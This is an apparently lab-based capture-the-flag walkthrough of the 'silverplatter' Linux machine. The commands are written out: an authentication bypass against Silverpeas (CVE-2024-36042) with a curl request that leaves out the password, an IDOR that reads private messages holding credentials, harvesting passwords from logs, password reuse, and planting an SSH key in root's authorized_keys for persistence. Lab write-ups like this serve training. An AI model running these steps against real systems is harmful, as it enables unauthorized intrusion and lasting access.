# silverplatter

**Status:** Completed
**Target:** `$TARGET`
**OS:** Linux
**Difficulty:** Easy

## Recon

```bash
# What it does: execute a full TCP port scan using the silent-scan alias.
# Why here: discover open ports to map the attack surface.
silent-scan $TARGET

# What it does: perform service version detection and default script scanning on discovered ports.
# Why here: fingerprint SSH and the web server running on port 80.
nmap -sVC -p22,80,8080 $TARGET -oN service
```

**Output**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open http
```

## Web Enumeration

Exploring the website on port 80 reveals a hidden `#elements` block containing a form that redirects to `#`. The page also mentions "Silverpeas".

Accessing port 8080 directly:
`http://$TARGET:8080/silverpeas` reveals a login panel.

### Silverpeas Authentication Bypass (CVE-2024-36042)

Researching the Silverpeas version reveals an authentication bypass vulnerability (CVE-2024-36042). The vulnerability allows logging in by omitting the password parameter for an existing user. A user named `scr1ptkiddy` was found previously on the port 80 website.

```bash
# What it does: send an authentication request to the Silverpeas servlet omitting the password parameter.
# Why here: exploit CVE-2024-36042 to bypass authentication and retrieve a valid session cookie for scr1ptkiddy.
curl -X POST http://$TARGET:8080/silverpeas/AuthenticationServlet \
  -d "Login=scr1ptkiddy&DomainId=0" \
  -v                      
```

**Output**
```text
* upload completely sent off: 28 bytes
< HTTP/1.1 302 Found
< Set-Cookie: JSESSIONID=6jlinFKbiSkdtiTbm2Oiq6FzLykYLhz2c1pJXKU2.ebabc79c6d2a; path=/silverpeas; HttpOnly
```

After capturing the `JSESSIONID` cookie, inject it into the browser and navigate to the application dashboard:
`http://$TARGET:8080/silverpeas/look/jsp/MainFrame.jsp`

Authentication is successful. Other users observed in the system include `silveradmin` and `manager`.

### Silverpeas File Read / IDOR

Further research reveals IDOR/file read vulnerabilities in Silverpeas (e.g., in the RSILVERMAIL component).

```text
http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jspID=1
```

By iterating through message IDs via Burp Suite or manual browsing, ID `6` reveals SSH credentials.

```url
http://$TARGET:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jspID=6
```

**Output**
```text
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

## Initial Access

```bash
# What it does: authenticate via SSH using the discovered credentials.
# Why here: establish a foothold on the server and retrieve the user flag.
ssh tim@$TARGET
cat /etc/passwd | grep -E "bash|sh"
printenv
```

## Linux Enumeration & Lateral Movement

The user `tim` belongs to the `adm` group, granting read access to `/var/log`.

```bash
# What it does: search recursively through system logs for password-related keywords.
# Why here: discover leaked credentials or sensitive command executions stored in system logs.
grep -r -E -i 'password|passwd|PASSWORD' /var/log/ 
```

**Output**
```text
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
```

The logs reveal that user `tyler` executed a Docker command that passed a PostgreSQL password `_Zd_zx7N823/` as an environment variable. 

Since `tim` cannot interact with Docker, we attempt password reuse against the `tyler` user via SSH.

```bash
# What it does: authenticate as the user tyler using the leaked database password.
# Why here: perform lateral movement using password reuse to gain higher privileges.
ssh tyler@$TARGET
# Password: _Zd_zx7N823/

# What it does: check sudo privileges for the new user.
# Why here: identify potential escalation vectors to root.
sudo -l
```

**Output**
```text
User tyler may run the following commands on ip-10-129-142-0:                               
    (ALL : ALL) ALL 
```

## Privilege Escalation

The user `tyler` has unrestricted sudo privileges.

```bash
# What it does: read the root flag directly using sudo.
# Why here: retrieve the final flag since the user has full sudo rights.
sudo cat /root/root.txt

# What it does: inject the attacker's public SSH key into the root authorized_keys file.
# Why here: establish persistent root access without relying on the user's password.
echo "ssh-rsa EKJ5MfN6oklTYmD+....." | sudo tee -a /root/.ssh/authorized_keys
ssh root@$TARGET
```

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [curl](../../../tools/web/curl.md)
